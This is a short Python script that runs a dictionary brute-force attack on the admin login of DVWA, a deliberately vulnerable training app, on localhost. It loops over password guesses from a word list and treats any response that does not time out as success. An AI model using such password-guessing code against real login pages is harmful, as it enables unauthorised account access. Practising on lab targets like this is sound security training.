import requests
params={
	'username':'admin',
	'password':'1234',
	'Login':'Login'
}

login_url = "http://localhost/DVWA/login.php/"

fp = open("./dictionary.txt","r")
dictionary_list = [x.strip() for x in fp.readlines()]

for upw in dictionary_list:
	url = f'http://localhost/DVWA/vulnerabilities/brute/?username=admin&password={upw}&Login=Login#'
	s = requests.session()
	res = s.post(login_url,data=params)
	cookie = {'PHPSESSID': res.cookies['PHPSESSID'],'security':'medium'}

	try:
		response = requests.get(url=url,timeout=0.5,cookies=cookie)
	except requests.exceptions.Timeout as TT:
		print(f'[x] Failed... {upw}')
		s.close()
	else:
		print(f"[o] SUCCESS... {upw}")
		break
